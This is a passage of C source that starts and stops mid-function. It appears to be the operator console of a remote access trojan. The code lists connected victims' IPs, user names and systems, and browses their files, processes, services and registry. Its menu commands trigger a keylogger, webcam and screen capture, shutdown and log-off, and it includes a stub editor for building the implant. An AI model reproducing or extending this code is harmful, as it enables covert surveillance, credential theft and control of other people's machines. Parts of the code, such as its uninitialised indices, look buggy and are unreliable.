                LvItem.pszText=RECV.Scr_res;
                LvItem.iSubItem=9;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


                LvItem.pszText=Temp;
                LvItem.iSubItem=10;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems




                GetTime();
                sprintf(LSSocket, "%s","Main Socket");
                sprintf(LSAction, "Connection established with %s",RECV.IP_add);
                sprintf(LSStatus, "%s","Pass");
                sprintf(LSPort, "%s", MPort);

                SetSockLog(LSSocket,LSAction,LSPort,Time,0);


                /*sprintf(LSSocket, "%s","Utility Socket");
                sprintf(LSAction, "Connection established with %s",RECV.IP_add);
                sprintf(LSStatus, "%s","Pass");
                sprintf(LSPort, "%s", FPort);

                SetSockLog(LSSocket,LSAction,LSPort,Time,LSStatus);*/

                /*ZeroMemory(&RECV.IP_add[0],sizeof(&RECV.IP_add));
                ZeroMemory(&RECV.cpt_name[0],sizeof(&RECV.cpt_name));
                ZeroMemory(&RECV.OS_Ver[0],sizeof(&RECV.OS_Ver));
                ZeroMemory(&RECV.User[0],sizeof(&RECV.User));
                ZeroMemory(&RECV.Admin[0],sizeof(&RECV.Admin));
                ZeroMemory(&RECV.Processor_specs[0],sizeof(&RECV.Processor_specs));
                ZeroMemory(&RECV.Scr_res[0],sizeof(&RECV.Scr_res));*/
                InitSettings();

               if(strstr(NotifyNewUsr,"ON"))
               {
                char NewUsrTitle[30];
                char NewUsrInfo[600];


                sprintf(NewUsrTitle,"New connection established(%d in total)",Count_Connection+1);
                /*lstrcpy(NewUsrTitle,"New connection made(");
                lstrcat(NewUsrTitle,ConNum);
                lstrcat(NewUsrTitle," in total)");*/


                lstrcpy(NewUsrInfo,"Remote IP: ");
                lstrcat(NewUsrInfo,RECV.IP_add);
                lstrcat(NewUsrInfo,"\n");
                lstrcat(NewUsrInfo,"Computer name \\ User name: ");
                lstrcat(NewUsrInfo,RECV.cpt_name);
                lstrcat(NewUsrInfo,"\\");
                lstrcat(NewUsrInfo,RECV.User);
                lstrcat(NewUsrInfo,"\n");
                lstrcat(NewUsrInfo,"Operating system: ");
                lstrcat(NewUsrInfo,RECV.OS_Ver);

                SysTrayShowBalloon(hwndDlg,NewUsrTitle, NewUsrInfo, NIIF_INFO);
               }


            }
            break;

            case SEND_DRIVES:
            {

                if(lstrlen(RECV.Drives)!=0)
                {

            char copydrv[5];
            char printdrv[5];
            ZeroMemory(&copydrv[0],sizeof(copydrv));
            ZeroMemory(&printdrv[0],sizeof(printdrv));
            strcpy(copydrv,RECV.Drives);


            int r = 0;

            for(r = 0; r < strlen(copydrv); r++)
            {
                if(copydrv[r]=='\\')
                {


                    break;

                }

            }

            for(int i = 0; i<r; i++)
            {
                printdrv[i]=copydrv[i];
            }

            //MessageBox(NULL, printdrv, "POS", MB_OK);



                    tvinsert.hParent=NULL; // top most level Item
                    // root level item attribute.
                    tvinsert.hInsertAfter=TVI_ROOT;
                    // attributs
                    tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
                    // item text
                    switch(RECV.DriveType)
                    {
                        //DRIVE_REMOVABLE
                    case 1:
                        tvinsert.item.iImage=5;
                        tvinsert.item.iSelectedImage=5; // pressed pic
                        break;

                        //DRIVE_REMOTE
                    case 2:
                        tvinsert.item.iImage=2;
                        tvinsert.item.iSelectedImage=2; // pressed pic
                        break;

                        //DRIVE_UNKNOWN
                    case 3:
                        tvinsert.item.iImage=0;
                        tvinsert.item.iSelectedImage=0; // pressed pic
                        break;

                        //DRIVE_FIXED
                    case 4:
                        tvinsert.item.iImage=0;
                        tvinsert.item.iSelectedImage=0; // pressed pic
                        break;

                        //DRIVE_CDROM
                    case 5:
                        tvinsert.item.iImage=1;
                        tvinsert.item.iSelectedImage=1; // pressed pic
                        break;

                        //DRIVE_RAMDISK
                    case 6:
                        tvinsert.item.iImage=0;
                        tvinsert.item.iSelectedImage=0; // pressed pic
                        break;
                    }
                    tvinsert.item.pszText=printdrv;
                    Parent=(HTREEITEM)SendDlgItemMessage(hwndFile,IDC_TREE1,
                                                         TVM_INSERTITEM,0,(LPARAM)&tvinsert);
                    TreeView_Select(GetDlgItem(hwndFile,IDC_TREE1), Selected, TVGN_CARET);
                    TreeView_Expand(GetDlgItem(hwndFile,IDC_TREE1), Selected, TVM_EXPAND);
                    //tvinsert.item.iImage=0;

                }

                ZeroMemory(&RECV.Drives[0],sizeof(&RECV.Drives));

            }
            break;



            case SEND_FILES:
            {
                int Itemindex;
                LV_ITEM	 iItem;
                Itemindex=SendMessage(hList2,LVM_GETITEMCOUNT,0,0);
                ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST2),FImageList, LVSIL_SMALL);


                if((lstrlen(RECV.File) && lstrlen(RECV.FileSize))!=0)
                {




                        LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                        LvItem2.iSubItem=0;                 // adding item, no need subitems
                        LvItem2.pszText=RECV.File;          // set pointer to the item text
                        LvItem2.iImage=RECV.File_type;
                        SendMessage(hList2,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                        LvItem2.pszText=RECV.FileSize;
                        LvItem2.iSubItem=1;
                        SendMessage(hList2,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                        ZeroMemory(&RECV.FileSize[0],sizeof(&RECV.FileSize));
                        ZeroMemory(&RECV.File[0],sizeof(&RECV.File));
                        break;






                }

                // ZeroMemory(&RECV.FileSize[0],sizeof(&RECV.FileSize));
                // ZeroMemory(&RECV.File[0],sizeof(&RECV.File));



            }
            break;

            case SEND_FOLDERS:
            {

                if(lstrlen(RECV.Folder)!=0)
                {

                    if(strstr(RECV.Folder, ".") || strstr(RECV.Folder, ".."))
                    {
                        break;
                    }


                    tvinsert.hParent=Selected; // top most level Item
                    // root level item attribute.
                    tvinsert.hInsertAfter=TVI_ROOT;
                    // attributs
                    tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
                    // item text
                    tvinsert.item.pszText=RECV.Folder;
                    tvinsert.item.iImage=3; // not pressed pic
                    tvinsert.item.iSelectedImage=4; // pressed pic
                    Parent=(HTREEITEM)SendDlgItemMessage(hwndFile,IDC_TREE1,
                                                         TVM_INSERTITEM,0,(LPARAM)&tvinsert);
                    TreeView_Select(GetDlgItem(hwndFile,IDC_TREE1), Selected, TVGN_CARET);
                    TreeView_Expand(GetDlgItem(hwndFile,IDC_TREE1), Selected, TVM_EXPAND);

                }

                ZeroMemory(&RECV.Folder[0],sizeof(&RECV.Folder));


            }
            break;


            case SEND_TASKS:
            {
                int Itemindex;
                Itemindex=SendMessage(hList3,LVM_GETITEMCOUNT,0,0);

                sprintf(ProcessNo,"Processes: %d",Itemindex);
                ListView_SetImageList(GetDlgItem(hwndTask, IDC_LIST3),TImageList, LVSIL_SMALL);



                if((lstrlen(RECV.Procs) && lstrlen(RECV.PID) && lstrlen(RECV.ParentPID) && lstrlen(RECV.Threads) && lstrlen(RECV.PRIORITY))!=0)
                {

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0; // adding item, no need subitems
                    LvItem2.iImage=0;
                    LvItem2.pszText=RECV.Procs;          // set pointer to the item text
                    SendMessage(hList3,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                    LvItem2.pszText=RECV.PID;
                    LvItem2.iSubItem=1;
                    SendMessage(hList3,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.Threads;
                    LvItem2.iSubItem=2;
                    SendMessage(hList3,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.ParentPID;
                    LvItem2.iSubItem=3;
                    SendMessage(hList3,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.PRIORITY;
                    LvItem2.iSubItem=4;
                    SendMessage(hList3,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems



                }

                ZeroMemory(&RECV.Procs[0],sizeof(&RECV.Procs));
                ZeroMemory(&RECV.PID[0],sizeof(&RECV.PID));
                ZeroMemory(&RECV.Threads[0],sizeof(&RECV.Threads));
                ZeroMemory(&RECV.ParentPID[0],sizeof(&RECV.ParentPID));
                ZeroMemory(&RECV.PRIORITY[0],sizeof(&RECV.PRIORITY));


                SendMessage(hStatus3, SB_SETTEXT, 0, (LPARAM)RECV.PhyMem);
                SendMessage(hStatus3, SB_SETTEXT, 1, (LPARAM)ProcessNo);


            }
            break;

            case SEND_SRVCS:
            {

                int Itemindex;
                Itemindex=SendMessage(hList9,LVM_GETITEMCOUNT,0,0);
              //  ListView_SetImageList(GetDlgItem(hwndTask, IDC_LIST9),TImageList, LVSIL_SMALL);



                if((lstrlen(RECV.Srvcname) && lstrlen(RECV.SrvcDispname) && lstrlen(RECV.SrvcStatus) && lstrlen(RECV.SrvcStartup))!=0)
                {

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0; // adding item, no need subitems
                    LvItem2.iImage=0;
                    LvItem2.pszText=RECV.Srvcname;          // set pointer to the item text
                    SendMessage(hList9,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                    LvItem2.pszText=RECV.SrvcDispname;
                    LvItem2.iSubItem=1;
                    SendMessage(hList9,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.SrvcStatus;
                    LvItem2.iSubItem=2;
                    SendMessage(hList9,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.SrvcStartup;
                    LvItem2.iSubItem=3;
                    SendMessage(hList9,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems





                }

                /*   ZeroMemory(&RECV.Procs[0],sizeof(&RECV.Procs));
                   ZeroMemory(&RECV.PID[0],sizeof(&RECV.PID));
                   ZeroMemory(&RECV.Threads[0],sizeof(&RECV.Threads));
                   ZeroMemory(&RECV.ParentPID[0],sizeof(&RECV.ParentPID));*/




            }
            break;


            case SCAN_PORT:
            {

                int Itemindex;
                Itemindex=SendMessage(hList11,LVM_GETITEMCOUNT,0,0);





                if((lstrlen(RECV.ScanIP) && lstrlen(RECV.ScanPort) && lstrlen(RECV.ScanStat))!=0)
                {

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0; // adding item, no need subitems
                    LvItem2.iImage=0;
                    LvItem2.pszText=RECV.ScanIP;          // set pointer to the item text

                    switch(RECV.ScanImg)
                    {
                        case 0:
                        LvItem2.iImage= 1;
                        break;

                        case 1:
                        LvItem2.iImage= 0;
                        break;
                    }

                    SendMessage(hList11,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                    LvItem2.pszText=RECV.ScanPort;
                    LvItem2.iSubItem=1;
                    SendMessage(hList11,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems


                    LvItem2.pszText=RECV.ScanStat;
                    LvItem2.iSubItem=2;
                    SendMessage(hList11,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems

                    ListView_SetImageList(GetDlgItem(hwndPScan, IDC_LIST11),SockImageList, LVSIL_SMALL);



                }




            }
            break;

            case SEND_WINDOWS:
            {
                int Itemindex;
                Itemindex=SendMessage(hList5,LVM_GETITEMCOUNT,0,0);
                ListView_SetImageList(GetDlgItem(hwndTask, IDC_LIST5),TImageList, LVSIL_SMALL);


                if((lstrlen(RECV.Windows))!=0)
                {
                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0;                 // adding item, no need subitems
                    LvItem2.pszText=RECV.Windows;          // set pointer to the item text
                    LvItem2.iImage= 1;
                    SendMessage(hList5,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it

                }
                //SetDlgItemText(hwndTask,IDC_TASK_STATUS , RECV.PhyMem);


            }
            break;

            case SEND_INSTALLS:
            {

                int Itemindex;
                Itemindex=SendMessage(hList4,LVM_GETITEMCOUNT,0,0);
                ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST4),FImageList, LVSIL_SMALL);


                if((lstrlen(RECV.Installs) && lstrlen(RECV.Path))!=0)
                {

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0;                 // adding item, no need subitems
                    LvItem2.pszText=RECV.Installs;          // set pointer to the item text
                    LvItem2.iImage= 10;
                    SendMessage(hList4,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                    LvItem2.pszText=RECV.Path;
                    LvItem2.iSubItem=1;
                    SendMessage(hList4,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems



                }


            }
            break;

            case SEND_FILE_SEARCH:
            {

                int Itemindex;
                Itemindex=SendMessage(hList2,LVM_GETITEMCOUNT,0,0);

                if((lstrlen(RECV.FoundFile))!=0)
                {

    int i;
    int j;
    int k;
    char Data[MAX_PATH];
    char Data2[MAX_PATH];
    char Sfilename[250];


    for(i=0; i<strlen(RECV.FoundFile); i++)
    {

        if(RECV.FoundFile[i] == '\\')
        {
            RECV.FoundFile[i] = '/';
        }
    }

    ZeroMemory(&Data[0],sizeof(Data));
    strcpy(Data, RECV.FoundFile);

    i = strlen(Data);


    ZeroMemory(&Data2[0],sizeof(Data2));
    while(Data[i] != '/')
    {
        i--;
        Data2[j] = Data[i];
        j++;
    }
    i++;
    //j--;
    int x;
    ZeroMemory(&Sfilename[0],sizeof(Sfilename));
    for(k=(strlen(Data2)-2); k>=0; k--)
    {

        Sfilename[x] = Data2[k];
        x++;
    }

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0;                 // adding item, no need subitems
                    LvItem2.pszText=Sfilename;          // set pointer to the item text
                    SendMessage(hList2,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it

                    LvItem2.iItem=Itemindex+1;            // item will be put at itemIndex
                    LvItem2.iSubItem=0;                 // adding item, no need subitems
                    LvItem2.pszText=RECV.FoundFile;          // set pointer to the item text
                    SendMessage(hList2,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it

                }

            }
            break;

            case SEND_FILE_SEARCHNUM:
            {
                char DispFileNum[50];
                sprintf(DispFileNum,"%d %s",RECV.FoundNum,"Files found");
                MessageBox(hwndFile,DispFileNum,"Search complete",MB_OK|MB_ICONINFORMATION);

            }
            break;


            case SEND_REG_MAN:
            {
                switch(RECV.RegID)
                {
                    case 0:
                    {
                    AddKeyFolder(RECV.KeyFold);
                    }
                    break;

                    case 1:
                    {
                    AddKeyValue(RECV.KeyVal,RECV.datatype,RECV.keydata);
                    }
                    break;

                }

            }
            break;



            case DLOAD_TERMINATED:
            {
                //TerminateThread(FileDloadHandle,0);
                ZeroMemory(&DLfilename[0],sizeof(&DLfilename));
                char asxTEXT[]="Status:Stoped";
                SetWindowText(GetDlgItem(hwndDLstat, IDC_DLSTATIC),asxTEXT);
                ShowWindow(GetDlgItem(hwndDLstat, IDC_DLSTATIC),SW_SHOW);
                filesizecheck = 0;
            }
            break;


            case DLOAD_SUSPENDED:
            {
                //SuspendThread(FileDloadHandle);
                char asxTEXT[]="Status:Paused";
                SetWindowText(GetDlgItem(hwndDLstat, IDC_DLSTATIC),asxTEXT);
                ShowWindow(GetDlgItem(hwndDLstat, IDC_DLSTATIC),SW_SHOW);
            }
            break;


            case DLOAD_RESUMED:
            {
                //ResumeThread(FileDloadHandle);
                char asxTEXT[]="Status:Downloading";
                SetWindowText(GetDlgItem(hwndDLstat, IDC_DLSTATIC),asxTEXT);
                ShowWindow(GetDlgItem(hwndDLstat, IDC_DLSTATIC),SW_SHOW);
            }
            break;


            }
            //}

            //Sleep(1);
        }
        break;

        case FD_CLOSE:
        {
            for(int t=0;t<=Count_Connection;t++)
            {
                 SEND.PacketType = PING;
                 if(send(Socket[t],(char*)&SEND,HeadSize2,0)==SOCKET_ERROR)
                {
                    if(WSAGetLastError() == WSAECONNRESET)
                    {
                      SendMessage(hList,LVM_DELETEITEM,t,0);
                    }
                }
              }
              MClient--;



            Count_Connection-=1;
            AcConNumStat = Count_Connection+1;

            ZeroMemory(&ConNum[0],sizeof(&ConNum));
            int ConNumD = Count_Connection+1;
            sprintf(ConNum, "Users:  [%d]", ConNumD );
            SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConNum);

            GetTime();
            sprintf(LSSocket, "%s","Main Socket");
            sprintf(LSAction, "%s","Closed");
            sprintf(LSStatus, "%s","Pass");
            sprintf(LSPort, "%s", MPort);

            //SetSockLog(LSSocket,LSAction,LSPort,Time,LSStatus);

        sprintf(AcConStat,"%s: %d","Active Connections",AcConNumStat);
        sprintf(AllConStat,"%s: %d","All Connections",AllConNum);

        SetWindowText(GetDlgItem(hwndStat, IDC_ACCONSTATIC),AcConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ACCONSTATIC),SW_SHOW);

        SetWindowText(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),AllConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),SW_SHOW);

        }
        break;


        case FD_ACCEPT:
        {

            if(MClient<nMaxClients)
            {
                int size=sizeof(sockaddr);
                Socket[MClient]=accept(wParam,&sockAddrClient,&size);
                if (Socket[MClient]==INVALID_SOCKET)
                {
                    int nret = WSAGetLastError();
                    WSACleanup();
                }
                //SetDlgItemText(hwndDlg, ID_MAIN_STATUS, "Client Connected");
                Count_Connection+=1;
                AcConNumStat = Count_Connection+1;

                ZeroMemory(&ConNum[0],sizeof(&ConNum));
                int ConNumC = Count_Connection+1;
                sprintf(ConNum, "Users:  [%d]", ConNumC );
                SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConNum);

            MClient++;
            AllConNum = MClient;

        sprintf(AcConStat,"%s: %d","Active Connections",AcConNumStat);
        sprintf(AllConStat,"%s: %d","All Connections",AllConNum);

        SetWindowText(GetDlgItem(hwndStat, IDC_ACCONSTATIC),AcConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ACCONSTATIC),SW_SHOW);

        SetWindowText(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),AllConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),SW_SHOW);



            SEND.PacketType = CONFIRM_ONLINE;
            SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
            Sleep(1);

            /* if(Connected = false)
            {
             UtilListen(hwndMain);
             FileListen(hwndMain);
             Connected = true;
             Sleep(1);
            }*/
           /* SEND.PacketType = INIT_FSOCK;
            SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            Sleep(1);

            SEND.PacketType = INIT_DLFSOCK;
            SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();*/
            //Sleep(1);
            SendMessage(hStatus, SB_SETTEXT, 2, (LPARAM)"");
            }

            else
            {
                SendMessage(hStatus, SB_SETTEXT, 2, (LPARAM)"Max connection reached");
            }


        }
        break;

        }
    }
    return TRUE;


    case WM_CLOSE:
        //EndDialog(hwndDlg, 0);
        DeleteObject(g_hbmScrSht);
        RemoveSysTrayNotifier(hwndDlg);
        ExitProcess(0);

        return TRUE;

    case WM_COMMAND:
    {

        switch(LOWORD(wParam))
        {
        case ID_TOOLS_FILEMANAGER:
        {
            EndDialog(hwndFile,0);
            CreateThread(NULL, 0,FileWindow,(LPVOID)lParam, 0,0);
            Sleep(1);
            SEND.PacketType = REQ_DRIVES;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();


            GetTime();
            sprintf(LTaskName, "%s","File manager");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,LUserName,Time,1);

        }
        break;


        case IDC_STATISTICS:
        {
            EndDialog(hwndStat,0);
            CreateThread(NULL, 0,StatisticsWindow,(LPVOID)lParam, 0,0);
        }
        break;


        case ID_TOOLS_TASKMANAGER:
        {
            EndDialog(hwndTask,0);
            CreateThread(NULL, 0,TaskWindow,(LPVOID)lParam, 0,0);
            //Sleep(1);
            /*SEND.PacketType = REQ_WINDOWS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();*/

            GetTime();
            sprintf(LTaskName, "%s","Task manager");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SCAN_PORT:
        {
            EndDialog(hwndPScan,0);
            CreateThread(NULL, 0,PortScanWindow,(LPVOID)"", 0, &thread);

            GetTime();
            sprintf(LTaskName, "%s","Port scanner");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);



        }
        break;



        case IDC_REM_CLIPBOARD:
        {

            EndDialog(hwndCBoard,0);
            CreateThread(NULL, 0,ClipBoardWindow,(LPVOID)"", 0, &thread);

            GetTime();
            sprintf(LTaskName, "%s","Remote clipboard");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;


        case ID_TOOLS_REGMAN:
        {
            EndDialog(hwndReg,0);
            CreateThread(NULL, 0,RegWindow,(LPVOID)lParam, 0,0);
            //Sleep(1);
            SEND.PacketType = REQ_TASKS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Registery manager");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case ID_TOOLS_KEYLOGGER:
        {
            EndDialog(hwndKeylog,0);
            CreateThread(NULL, 0,KeyLogWindow,(LPVOID)lParam, 0,0);
            Sleep(1);
            //SetDlgItemText(hwndKeylog,IDC_DISP_LOG,"TESTING");
            SEND.PacketType = SEND_LOGS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();


            GetTime();
            sprintf(LTaskName, "%s","Keylogger");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case ID_WEBCAM_CAP:
        {
            SEND.PacketType = CAP_WEBCAM;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Webcam capture");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SCREEN_CAP:
        {
            SEND.PacketType = CAP_SCREEN;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            //CreateThread(NULL, 0,ScrShotWindow,(LPVOID)lParam, 0,0);
            CreateThread(NULL, 0,DLSHOTWindow,(LPVOID)lParam, 0,0);

            GetTime();
            sprintf(LTaskName, "%s","Screen capture");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SYS_SHTDWN:
        {
            SEND.PacketType = SHUT_DOWN_PC;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","System shutdown");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SYS_LGOFF:
        {
            SEND.PacketType = LOG_OFF_PC;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","System Log-Off");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SYS_MOFF:
        {
            SEND.PacketType = TURN_OFF_PC;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Turn-Off monitor");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_SYS_MON:
        {
            SEND.PacketType = TURN_ON_PC;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Turn-On monitor");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_HOST_INFO:
        {
          CreateThread(NULL, 0,HostInfoWindow,(LPVOID)"", 0, &thread);

            GetTime();
            sprintf(LTaskName, "%s","Host information");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);
        }
        break;

        case ID_EDIT_STUB:
        {

            DialogBox(GInstance,(LPCTSTR)IDD_SERVEREDIT,hwndMain,(DLGPROC)EditProc);

            GetTime();
            sprintf(LTaskName, "%s","Stub Editor");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,0,Time,1);

        }
        break;


        case ID_MMENU_EXIT:
        {
          ExitProcess(0);
          DeleteObject(g_hbmScrSht);
        }
        break;


        case ID_MMENU_ABOUT:
        {
            EndDialog(hwndabt,0);
            DialogBox(AInst,(LPCTSTR)About_Dlg,0,(DLGPROC)About_Dlg_Proc);
            //CreateThread(NULL, 0,AboutWindow,(LPVOID)lParam, 0,0);

            GetTime();
            sprintf(LTaskName, "%s","Open ");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,0,Time,LStatus);

        }
        break;

        case ID_MMENU_MANUAL:
        {
            // Init_FDload();
            //MessageBox(NULL,DL_Filename/*Data2*/,"TEST", MB_OK | MB_ICONERROR);
        }
        break;

        case ID_MMENU_OPTION_SETTING:
        {
            DialogBox(GInstance,(LPCTSTR)IDD_SETTINGS,hwndMain,(DLGPROC)SettingProc);
            //CreateDialog(GetModuleHandle(NULL),MAKEINTRESOURCE(ID_CHAT_DLG),hwnd,CHATDlgProc);

        }
        break;

        case IDC_BROWSE_WEB:
        {
            EndDialog(hwndWebpage,0);
            CreateThread(NULL, 0,BrowseWebWindow,(LPVOID)"", 0, &thread);

            GetTime();
            sprintf(LTaskName, "%s","Browse webpage");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        //case IDC_BTN_QUIT:
        // {
        //SendMessage(hList,LVM_DELETEALLITEMS,0,0);
        /*if(flag) // we pressed an item?
        SendMessage(hList,LVM_DELETEITEM,iSelect,0); // delete the item selected

        flag=0; // reset the flag after we used the item
        break;*/

        // }
        // return TRUE;


        case ID_MMENU_OPTION_LISTEN:
        {

          if(atoi(MPort)<1)
          {
              MessageBox(hwndMain,"Socket not Configured\nGoto Options->Settings->Network","Error",MB_OK|MB_ICONERROR);
              return 0;
          }

if(strstr(isAutoPort,"OFF"))
{

          if(atoi(FPort)<1)
          {
              MessageBox(hwndMain,"Socket not Configured\nGoto Options->Settings->Network","Error",MB_OK|MB_ICONERROR);
              return 0;
          }

          if(atoi(UPort)<1)
          {
              MessageBox(hwndMain,"Socket not Configured\nGoto Options->Settings->Network","Error",MB_OK|MB_ICONERROR);
              return 0;
          }
}

            Listen(hwndMain);
            UtilListen(hwndDlg);
            FileListen(hwndMain);

            /*  GetTime();
              sprintf(LTaskName, "%s","");
              sprintf(LStatus, "%s","pass");
              sprintf(LUserName, "%s", MTemp);

              setlog(LTaskName,0,Time,LStatus); */

        }
        return TRUE;

        case ID_MMENU_OPTION_STOP:
        {

         CloseConnections();

        }
        return TRUE;


        }

    }
    return TRUE;

    case WM_NOTIFY: // the message that is being sent always
    {


        RECT rc;    // client area
        POINT  pt;   // location of mouse click
        HMENU hmenu,mmenu;
        HMENU hmenuTrackPopup1,hmenuTrackPopup2,hmenuTrackPopup3,hmenuTrackPopup4;





        switch (((LPNMHDR)lParam)->code)
        {
        case TCN_SELCHANGE:
        {
